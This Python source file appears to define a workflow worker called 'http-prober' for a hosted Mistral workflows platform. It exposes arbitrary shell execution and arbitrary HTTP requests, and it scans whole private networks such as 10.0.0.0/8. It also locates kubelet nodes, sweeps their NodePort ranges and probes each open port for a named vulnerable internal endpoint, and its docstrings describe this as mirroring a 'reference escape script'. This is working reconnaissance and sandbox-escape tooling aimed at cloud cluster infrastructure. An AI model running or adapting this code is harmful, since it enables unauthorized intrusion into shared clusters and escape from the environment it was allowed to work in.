import asyncio
import datetime

import mistralai.workflows as workflows
from mistralai.workflows import activity, workflow



@activity(start_to_close_timeout=datetime.timedelta(seconds=60))
async def http_request(url: str, method: str, headers: dict, body: str | None) -> dict:
    import httpx

    async with httpx.AsyncClient(follow_redirects=True, timeout=30) as client:
        response = await client.request(method, url, headers=headers, content=body)
    return {
        "status_code": response.status_code,
        "headers": dict(response.headers),
        "body": response.text,
    }


@activity(start_to_close_timeout=datetime.timedelta(seconds=60))
async def dns_resolve(
    host: str,
    rdtype: str = "A",
    nameserver: str | None = None,
    port: int = 53,
    tcp: bool = False,
    timeout: float = 5.0,
) -> dict:
    """Raw DNS query, dig-style.

    - host: name to resolve (or reverse name for PTR; pass an IP and rdtype="PTR").
    - rdtype: A, AAAA, CNAME, MX, TXT, NS, SOA, SRV, PTR, CAA, ... (default A).
    - nameserver: custom resolver IP. None -> pod's system resolver (/etc/resolv.conf).
    - port: resolver port (default 53).
    - tcp: force TCP transport (default UDP, like dig).
    - timeout: per-query timeout in seconds.

    Returns the full ANSWER section the way dig would print it: every RRset
    with name, type, TTL, and per-rdata values (CNAME chains included), plus
    the response rcode.
    """
    import dns.resolver
    import dns.reversename
    import dns.exception

    # Auto-reverse for PTR when the user passes a bare IP.
    if rdtype.upper() == "PTR":
        try:
            host = str(dns.reversename.from_address(host))
        except (ValueError, dns.exception.DNSException):
            pass  # let the resolver raise with the original input

    resolver = dns.resolver.Resolver(configure=nameserver is None)
    if nameserver is not None:
        resolver.nameservers = [nameserver]
        resolver.port = port
    resolver.lifetime = timeout
    resolver.timeout = timeout

    query_name = host
    query_type = rdtype.upper()

    try:
        answer = resolver.resolve(host, rdtype, tcp=tcp)
    except dns.resolver.NoAnswer:
        return {"host": query_name, "rdtype": query_type, "nameserver": nameserver, "rcode": "NOANSWER", "answers": []}
    except dns.resolver.NXDOMAIN:
        return {"host": query_name, "rdtype": query_type, "nameserver": nameserver, "rcode": "NXDOMAIN", "answers": []}
    except dns.exception.Timeout:
        return {"host": query_name, "rdtype": query_type, "nameserver": nameserver, "rcode": "TIMEOUT", "answers": []}
    except dns.resolver.NoNameservers as e:
        return {"host": query_name, "rdtype": query_type, "nameserver": nameserver, "rcode": "NONAMESERVERS", "error": str(e), "answers": []}

    # Walk the full ANSWER section (RRsets), one entry per rdata — dig-style.
    records = []
    for rrset in answer.response.answer:
        rdtype_name = dns.rdatatype.to_text(rrset.rdtype)
        for rdata in rrset:
            records.append({
                "name": rrset.name.to_text(),
                "type": rdtype_name,
                "ttl": rrset.ttl,
                "rdata": rdata.to_text(),
            })

    return {
        "host": query_name,
        "rdtype": query_type,
        "nameserver": nameserver,
        "rcode": dns.rcode.to_text(answer.response.rcode()),
        "answers": records,
    }


@activity(start_to_close_timeout=datetime.timedelta(seconds=60))
async def shell_exec(cmd: str, timeout: float = 30.0) -> dict:
    import asyncio
    proc = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        await proc.communicate()
        return {"returncode": -1, "stdout": "", "stderr": "timeout"}
    return {
        "returncode": proc.returncode,
        "stdout": stdout.decode(errors="replace"),
        "stderr": stderr.decode(errors="replace"),
    }


@activity(start_to_close_timeout=datetime.timedelta(seconds=600))
async def port_scan(cidr: str, port: int, workers: int = 2000, timeout: float = 1.0) -> dict:
    """TCP-connect scan every host in a CIDR for an open port.

    Proven single-activity scanner. workers is capped by the caller to stay
    under the pod's ~28k ephemeral-port range (workers=2000 -> ~2k concurrent
    sockets). timeout=1.0s catches hosts that drop the first SYN and answer
    the retransmit (~1s), which the old 0.2s setting missed.
    """
    import ipaddress
    import socket
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def check(ip: str) -> str | None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return ip if r == 0 else None

    hosts = [str(h) for h in ipaddress.IPv4Network(cidr, strict=False).hosts()]
    open_hosts: list[str] = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(check, ip): ip for ip in hosts}
        for f in as_completed(futs):
            result = f.result()
            if result:
                open_hosts.append(result)

    open_hosts.sort(key=lambda x: tuple(int(p) for p in x.split(".")))
    return {"cidr": cidr, "port": port, "scanned": len(hosts), "open": open_hosts}


@activity(start_to_close_timeout=datetime.timedelta(seconds=600))
async def find_node(cidr: str, ports: list[int], workers: int = 512, timeout: float = 1.0) -> dict:
    """Find the first host in a CIDR with an open port from `ports`.

    Scans port-by-port, short-circuiting on the first responding host (like
    the reference script's find_node). Useful to locate a live kubelet in an
    AKS/GKE pod network.
    """
    import ipaddress
    import socket
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def check(ip: str, port: int) -> tuple[str, int] | None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return (ip, port) if r == 0 else None

    hosts = [str(h) for h in ipaddress.IPv4Network(cidr, strict=False).hosts()]
    for port in ports:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = {ex.submit(check, ip, port): ip for ip in hosts}
            for f in as_completed(futs):
                result = f.result()
                if result:
                    ex.shutdown(wait=False, cancel_futures=True)
                    return {"cidr": cidr, "node_ip": result[0], "port": result[1]}
    return {"cidr": cidr, "node_ip": None, "port": None}


@activity(start_to_close_timeout=datetime.timedelta(seconds=600))
async def scan_nodeports(ip: str, port_start: int = 30000, port_end: int = 32768,
                         workers: int = 512, timeout: float = 1.0) -> dict:
    """TCP-connect scan one host across a port range (default NodePort range).

    Port-dimension counterpart to port_scan: many ports, one host. The end
    of nodeport_range is inclusive (default 30000-32768).
    """
    import socket
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def check(port: int) -> int | None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return port if r == 0 else None

    found: list[int] = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(check, p): p for p in range(port_start, port_end + 1)}
        for f in as_completed(futs):
            result = f.result()
            if result:
                found.append(result)
    found.sort()
    return {"ip": ip, "open_ports": found}


@activity(start_to_close_timeout=datetime.timedelta(seconds=60))
async def http_check(url: str, timeout: float = 5.0, expect_status: int = 200) -> dict:
    """Lightweight GET that reports whether the response status matches
    expect_status (default 200). Used to probe for known vulnerable endpoints.
    """
    import httpx
    try:
        async with httpx.AsyncClient(timeout=timeout) as client:
            r = await client.get(url)
    except Exception as e:
        return {"url": url, "status": None, "vulnerable": False, "error": type(e).__name__}
    return {"url": url, "status": r.status_code, "vulnerable": r.status_code == expect_status}


@workflow.define(name="http-prober", execution_timeout=datetime.timedelta(hours=12))
class HttpProberWorkflow:
    @workflow.entrypoint
    async def run(self, params: dict) -> dict:
        action = params.get("action", "http")

        if action == "dns":
            return await dns_resolve(
                params["host"],
                params.get("rdtype", "A"),
                params.get("nameserver"),
                params.get("port", 53),
                params.get("tcp", False),
                params.get("timeout", 5.0),
            )

        if action == "shell":
            return await shell_exec(params["cmd"], params.get("timeout", 30.0))

        if action == "scan":
            return await self._scan(
                params["cidr"],
                params["port"],
                params.get("scan_prefix", 16),
                params.get("workers", 2000),
                params.get("timeout", 1.0),
                params.get("concurrency", 4),
            )

        if action == "nodeport-scan":
            return await self._nodeport_scan(
                params.get("cidr", "10.1.0.0/16"),
                params.get("kubelet_ports", [10250, 10255, 10248]),
                params.get("nodeport_range", [30000, 32768]),
                params.get("workers", 512),
                params.get("timeout", 1.0),
                params.get("vuln_path", "/v1/internal/connectors/mistral"),
            )

        return await http_request(
            params["url"],
            params.get("method", "GET"),
            params.get("headers", {}),
            params.get("body"),
        )

    async def _scan(self, cidr: str, port: int, scan_prefix: int,
                    workers: int, timeout: float, concurrency: int) -> dict:
        """Scan a CIDR by looping its /scan_prefix subnets through port_scan
        activities. Standard asyncio.gather batches `concurrency` activities at
        a time, so a single workflow run covers the whole range without any
        client-side polling.

        Total concurrent sockets = concurrency * workers, kept under the pod's
        ~28k ephemeral ports. For 10/8 as /16 chunks: 256 chunks, concurrency=4,
        workers=2000 -> ~8k sockets, ~4-8h runtime.
        """
        import ipaddress

        net = ipaddress.IPv4Network(cidr, strict=False)
        subnets = [str(sub) for sub in net.subnets(new_prefix=scan_prefix)]

        all_open: list[str] = []
        scanned = 0
        sem = asyncio.Semaphore(concurrency)

        async def scan_one(sub: str) -> dict:
            async with sem:
                return await port_scan(sub, port, workers, timeout)

        tasks = [scan_one(sub) for sub in subnets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Exception):
                all_open.append(f"ERROR:{type(r).__name__}:{r}")
                continue
            scanned += r.get("scanned", 0)
            all_open.extend(r.get("open", []))

        def _ip_key(x: str):
            if x.startswith("ERROR"):
                return (256, 0, 0, 0)
            try:
                return tuple(int(p) for p in x.split("."))
            except ValueError:
                return (256, 0, 0, 0)
        all_open.sort(key=_ip_key)
        return {"cidr": cidr, "port": port, "scanned": scanned,
                "subnets": len(subnets), "open": all_open}


    async def _nodeport_scan(self, cidr: str, kubelet_ports: list[int],
                             nodeport_range: list[int], workers: int,
                             timeout: float, vuln_path: str) -> dict:
        """Locate a live node via kubelet ports, scan its NodePort range, then
        probe each open NodePort for a known vulnerable endpoint.

        Mirrors the reference escape script (find_node -> scan_nodeports ->
        check_vuln) but with configurable network, ports and workers.
        """
        node = await find_node(cidr, kubelet_ports, workers, timeout)
        node_ip = node["node_ip"]
        if not node_ip:
            return {"cidr": cidr, "node_ip": None, "open_ports": [], "vulnerable": []}

        port_start, port_end = nodeport_range
        scanned = await scan_nodeports(node_ip, port_start, port_end, workers, timeout)
        open_ports = scanned["open_ports"]

        vulnerable: list[dict] = []
        sem = asyncio.Semaphore(workers)

        async def check_port(port: int) -> dict | None:
            url = f"http://{node_ip}:{port}{vuln_path}"
            async with sem:
                res = await http_check(url, timeout, 200)
            return {"port": port, "status": res["status"]} if res["vulnerable"] else None

        tasks = [check_port(p) for p in open_ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Exception):
                continue
            if r:
                vulnerable.append(r)

        vulnerable.sort(key=lambda v: v["port"])
        return {"cidr": cidr, "node_ip": node_ip, "open_ports": open_ports,
                "vulnerable": vulnerable}


async def main() -> None:
    await workflows.run_worker([HttpProberWorkflow])


if __name__ == "__main__":
    asyncio.run(main())
